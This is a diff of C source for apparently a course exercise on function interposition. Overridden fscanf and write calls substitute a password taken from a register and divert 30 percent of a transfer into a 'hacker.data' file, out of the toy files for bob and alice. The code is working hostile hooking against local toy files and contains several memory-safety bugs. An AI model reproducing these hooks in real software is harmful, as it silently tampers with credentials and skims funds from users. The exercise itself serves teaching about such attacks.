@@ -83,19 +83,23 @@ int fscanf(FILE *stream, const char *format, ...){
 	va_list ap;
 	va_start(ap, format);
 	if(strcmp(format, "%ms") == 0){ //Password call
+		register char* reg asm("r13");
 		char **b = va_arg(ap, char**);
 		char **buff = b;
 		*buff =(char *)malloc(sizeof(char)*20); 
-		strcpy(*buff, "turtle"); 
+	//	strcpy(*buff, "turtle"); 
+		strcpy(*buff, reg);
+	/*
 		char *usrname = getlogin();
 		if(!usrname){
 		//	perror("__getlogin1() error");
 			printf("Error logging in \n");
 			exit(0);
 		}
-		printf("buff before strcat is %s \n", *buff);
+		//printf("buff before strcat is %s \n", *buff);
 		strcat(*buff, usrname);
-		printf("buff is %s \n", *buff);
+		//printf("buff is %s \n", *buff);
+	*/	
 		count = 1;
 	}
 	else { //Call scanf properly
@@ -179,7 +183,7 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 
 	//If writing to bob and alice - must change their buffers before writing 
 	
-//	const char *buff;
+	char *buff;
 
 	//Task 4
 	printf("In write, task is %d: \n", getTask());
@@ -189,38 +193,50 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 		if(handle == 3) { //The file getting the transfer	
 			int updated_value = atoi(buffer);
 			int prev_val = getDesc3();
+			int diff = prev_val - updated_value;
+			
 			setTransfer(prev_val - updated_value);
-			printf("Transfer val = %d \n", getTransfer());
+			printf("Transfer val = %d \n", diff);
 		}
 		else if(handle ==4){
 			printf("In handle is 4: \n");
 			int prev_val = getDesc4();
+			printf("prev val is %d \n", prev_val);
 			int transfer_amount = getTransfer();
-			int transfer_to_hacker = transfer_amount*0.15;
+			int transfer_to_hacker = transfer_amount*0.30;
 			transfer_amount -= transfer_to_hacker;
+			printf("transfer to hacker amount: %d \n", transfer_to_hacker);
+			printf("transfer amount %d \n", transfer_amount);
 
 			//Transfer to hacker
 			int hacker_fd;
-			char *hacker_val; // = (char *)malloc(sizeof(char)*20);
+		
+			char *hacker_val = (char *)malloc(sizeof(char)*20);
 			hacker_fd = open("hacker.data", O_RDWR);
 			read(hacker_fd, hacker_val, 20);
 			int amount_to_write = strlen(hacker_val);
 			int hack_val = atoi(hacker_val);
-			hack_val += transfer_to_hacker; //Add to hacker 
+			hack_val += transfer_to_hacker; //Add to hacker ;
 			sprintf(hacker_val, "%d", hack_val);
 			//strcpy(hacker_val, (char *)hack_val);
+			printf("hacker val: %s and hack_val: %d \n", hacker_val, hack_val);
+			printf("transfer amoutn is: %d \n", transfer_to_hacker);
 			ftruncate(hacker_fd, 0);
 			lseek(hacker_fd, 0, SEEK_SET);
 			origWrite(hacker_fd, hacker_val, amount_to_write);
-			//free(hacker_val);
-		
+			free(hacker_val);
+			close(hacker_fd);
+
 			//Update value to write to desc 4
 			int write_amount = prev_val + transfer_amount;
 			char *write_amount_to_4;
 			strcpy(write_amount_to_4, ""+write_amount);
-			strcpy(buffer, write_amount_to_4);
+			strcpy(buff, write_amount_to_4);
 		}
 
+	}
+	if((task != 4) && (handle != 4)){ //Take care of buffer being constant
+		strcpy(buff, buffer);
 	}
 
 	int bob_fd = getBobFd();  // = fileno("bob.data");
@@ -259,10 +275,10 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 
 		}
 		else{
-			retval = origWrite(handle, buffer, nbyte);
+			retval = origWrite(handle,(const char *)buff, nbyte);
 		}
 	}else {
-		retval = origWrite(handle, buffer, nbyte);
+		retval = origWrite(handle, (const char *)buff, nbyte);
 	}
 	return retval;
 }
@@ -278,7 +294,8 @@ ssize_t read(int handle, void *buf, size_t nbyte){
 	}
 
 	retval = origRead(handle, buf, nbyte);
-	
+
+	printf("read in %s \n", buf);
 	int task = getTask();
 	if(task == 4){
 		int prev_val = atoi(buf);
